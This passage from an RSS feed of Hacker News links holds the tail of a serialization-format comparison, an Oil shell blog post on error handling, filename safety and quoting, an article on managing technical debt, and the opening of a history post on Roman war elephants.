<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Anything other than that specific version of that specific library is …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wiki.alopex.li/BetterThanJson">https://wiki.alopex.li/BetterThanJson</a></em></p>]]>
            </description>
            <link>https://wiki.alopex.li/BetterThanJson</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871946</guid>
            <pubDate>Fri, 23 Oct 2020 17:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four features that justify a new Unix shell]]>
            </title>
            <description>
<![CDATA[
Score 207 | Comments 142 (<a href="https://news.ycombinator.com/item?id=24871762">thread link</a>) | @diegocg
<br/>
October 23, 2020 | http://www.oilshell.org/blog/2020/10/osh-features.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/10/osh-features.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>
<ul>
<li>Related: Posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=escaping-quoting#escaping-quoting">escaping-quoting</a>, particularly <a href="http://www.oilshell.org/blog/2017/09/29.html">Git Log
in HTML</a> (2017).</li>
</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me
know</a> what you think is missing.</p>
<p>If you haven't read it already, see <a href="http://www.oilshell.org/blog/2018/01/28.html">Why Create a Unix
Shell?</a>.  It's the most popular page on this site,
though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>
<a name="dev-tools-improvements"></a>
<h3>Dev Tools Improvements</h3>
<p>Speaking of which, several people have pointed out that the dev process for Oil
is difficult.  I've addressed this recently by removing spew from …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.oilshell.org/blog/2020/10/osh-features.html">http://www.oilshell.org/blog/2020/10/osh-features.html</a></em></p>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/10/osh-features.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871762</guid>
            <pubDate>Fri, 23 Oct 2020 17:23:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Technical Debt: Why it'll ruin your software]]>
            </title>
            <description>
<![CDATA[
Score 186 | Comments 136 (<a href="https://news.ycombinator.com/item?id=24871348">thread link</a>) | @yannikyeo
<br/>
October 23, 2020 | https://labcodes.com.br/blog/articles/tech-debt.html | <a href="https://web.archive.org/web/*/https://labcodes.com.br/blog/articles/tech-debt.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://labcodes.com.br/blog/articles/tech-debt.html">https://labcodes.com.br/blog/articles/tech-debt.html</a></em></p>]]>
            </description>
            <link>https://labcodes.com.br/blog/articles/tech-debt.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871348</guid>
            <pubDate>Fri, 23 Oct 2020 16:44:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[War Elephants, Part II: Elephants Against Wolves (2019)]]>
            </title>
            <description>
<![CDATA[
Score 125 | Comments 48 (<a href="https://news.ycombinator.com/item?id=24870626">thread link</a>) | @plat12
<br/>
October 23, 2020 | https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>



